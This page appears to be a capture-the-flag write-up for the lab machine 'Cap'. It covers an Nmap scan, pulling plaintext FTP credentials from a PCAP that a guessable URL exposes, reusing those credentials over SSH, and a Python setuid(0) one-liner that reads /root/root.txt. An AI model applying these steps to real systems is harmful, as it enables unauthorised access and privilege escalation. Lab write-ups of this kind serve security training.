<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2025-05-10 Sat 00:27 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Cap</title>
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="/style.css"/>
</head>
<body>
<div id="content" class="content">
<h1 class="title">Cap</h1>
<p class="spacing-64" \>

<div id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#orgcaf0bcc">Enumeration</a></li>
<li><a href="#org60fe210">User</a></li>
<li><a href="#org045faae">Root</a></li>
</ul>
</div>
</div>

<p class="spacing-64" \>
<div id="outline-container-orgcaf0bcc" class="outline-2">
<h2 id="orgcaf0bcc">Enumeration</h2>
<div class="outline-text-2" id="text-orgcaf0bcc">
<p>
Starting off with <code>Nmap</code> (it was rather slow for this machine, for some reason):
</p>

<div class="org-src-container">
<pre class="src src-nil">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 17:55 WEST
Nmap scan report for 10.10.10.245
Host is up (0.042s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 03 Jul 2021 16:55:35 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 03 Jul 2021 16:55:30 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &lt;!DOCTYPE html&gt;
|     &lt;html class="no-js" lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
|     &lt;link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico"&gt;
|     &lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/font-awesome.min.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/themify-icons.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/metisMenu.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/owl.carousel.min.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/slicknav.min.css"&gt;
|     &lt;!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 03 Jul 2021 16:55:30 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/3%Time=60E096A8%P=x86_64-unknown-linux-gnu%r(
SF:GetRequest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:
SF:\x20Sat,\x2003\x20Jul\x202021\x2016:55:30\x20GMT\r\nConnection:\x20clos
SF:e\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:019386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\"no-js\"\x20lang=\"en
SF:\"&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x2
SF:0\x20&lt;meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\"&gt;\n\
SF:x20\x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"shortcut\x20icon\"\x20type=\"i
SF:mage/png\"\x20href=\"/static/images/icon/favicon\.ico\"&gt;\n\x20\x20\x20\
SF:x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.cs
SF:s\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css
SF:/font-awesome\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"
SF:\x20href=\"/static/css/themify-icons\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20
SF:rel=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\"&gt;\n\x20\x20\x2
SF:0\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.m
SF:in\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/stat
SF:ic/css/slicknav\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar")%r(HTTPOp
SF:tions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat
SF:,\x2003\x20Jul\x202021\x2016:55:30\x20GMT\r\nConnection:\x20close\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x
SF:20OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20
SF:text/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20
SF:\x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;bo
SF:dy&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20In
SF:valid\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;
SF:RTSP/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n")%r(FourOhFourRequest
SF:,189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Sat,\x2003\x20Jul\x202021\x2016:55:35\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:232\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2
SF:\x20Final//EN\"&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;
SF:/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2
SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x
SF:20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.32 seconds
</pre>
</div>

<p>
There is an FTP service running here because port 21 is open and is running the <code>vsftpd</code> service version <code>3.0.3</code>.
As expected there is also a web service running on port 80. An entry should be added to the <code>/etc/hosts</code> file to
access the website more easily through <code>cap.htb</code>:
</p>

<div class="org-src-container">
<pre class="src src-nil">10.10.10.245 cap.htb
</pre>
</div>

<p>
Accessing the website, we can see that we’re already “logged in” as <code>Nathan</code>. We have access to the network status, ip config and security network five second snapshots in the PCAP format.
</p>


<div id="org72f19d4" class="figure">
<p><img src="./images/img1.png" alt="img1.png" />
</p>
</div>
</div>
</div>
<div id="outline-container-org60fe210" class="outline-2">
<h2 id="org60fe210">User</h2>
<div class="outline-text-2" id="text-org60fe210">
<p>
After accessing the webpage to get the PCAP files, the URL was <code>http://cap.htb/data/21</code>. The number <code>21</code> seems to refer to the snapshot number/index.
When trying <code>http://cap.htb/data/20</code>, it also works. Using this logic, the URL <code>http://cap.htb/data/0</code> has the first snapshot of them all. The first one could be the most interesting because of possible plaintext passwords through FTP. If the first one does not have anything interesting, the following ones should be analyzed.
A great software to check the contents of PCAP files is <code>WireShark</code>, that is the one we’ll be using. After opening the file, we can see that there are many HTTP requests at first, but there is a second section with mostly FTP requests. From there we can see that there was a login request for the user <code>nathan</code>. Obviously, password comes after and since its FTP, it is in plaintext:
</p>


<div id="orgd756651" class="figure">
<p><img src="./images/img2.png" alt="img2.png" />
</p>
</div>

<p>
Having these FTP credentials, all we can do now is login on port 21 using an FTP client. We’ll be using FileZilla. The login redirects us to <code>/home/nathan</code> directory, which has the <code>user.txt</code>.
Since most users use the same password everywhere, the <code>username:password</code> combination found can also be used to access the machine through SSH.
</p>
</div>
</div>
<div id="outline-container-org045faae" class="outline-2">
<h2 id="org045faae">Root</h2>
<div class="outline-text-2" id="text-org045faae">
<p>
Getting the root here can be tricky. But one thing we know is that the website does show the output of some shell commands(<code>ipconfig</code> and <code>netstat</code>). So the first thing that we can do is check <code>/var/www/html</code> to see the websites code. By showing the contents of the <code>app.py</code> file, we see that the website is made in Flask. In the file, there is a function called <code>capture()</code> where a system command is used to obtain the PCAP files. It is using <code>tcpdump</code>, and it is being ran as root, obviously:
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-type">@app.route</span>(<span class="org-string">"/capture"</span>)
<span class="org-type">@limiter.limit</span>(<span class="org-string">"10 per minute"</span>)
<span class="org-keyword">def</span> <span class="org-function-name">capture</span>():

        get_lock()
        <span class="org-variable-name">pcapid</span> <span class="org-operator">=</span> get_appid()
        increment_appid()
        release_lock()

        <span class="org-variable-name">path</span> <span class="org-operator">=</span> os.path.join(app.root_path, <span class="org-string">"upload"</span>, <span class="org-builtin">str</span>(pcapid) <span class="org-operator">+</span> <span class="org-string">".pcap"</span>)
        <span class="org-variable-name">ip</span> <span class="org-operator">=</span> request.remote_addr
        <span class="org-comment-delimiter"># </span><span class="org-comment">permissions issues with gunicorn and threads. hacky solution for now.</span>
        <span class="org-comment-delimiter">#</span><span class="org-comment">os.setuid(0)</span>
        <span class="org-comment-delimiter">#</span><span class="org-comment">command = f"timeout 5 tcpdump -w {path} -i any host {ip}"</span>
        <span class="org-variable-name">command</span> <span class="org-operator">=</span> f<span class="org-string">"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w </span>{path}<span class="org-string"> -i any host </span>{ip}<span class="org-string">")'"""</span>
        os.system(command)
        <span class="org-comment-delimiter">#</span><span class="org-comment">os.setuid(1000)</span>

        <span class="org-keyword">return</span> redirect(<span class="org-string">"/data/"</span> <span class="org-operator">+</span> <span class="org-builtin">str</span>(pcapid))
</pre>
</div>

<p>
So, to actually get the root flag, we need to execute the same general command, but instead of <code>tcdump</code>, we access <code>/root/root.txt</code>:
</p>

<div class="org-src-container">
<pre class="src src-nil">$ python3 -c 'import os; os.setuid(0); os.system("cat /root/root.txt")'
</pre>
</div>
</div>
</div>
<hr>
<footer>
  <div class="container">
    <ul class="menu-list">
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/index.html">Home</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/articles/articles.html">Articles</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/writeups/writeups.html">Write-Ups</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a class="inactive-link">24-04-2021</a>
      </li>
    </ul>
  </div>
</footer>
</div>
</body>
</html>
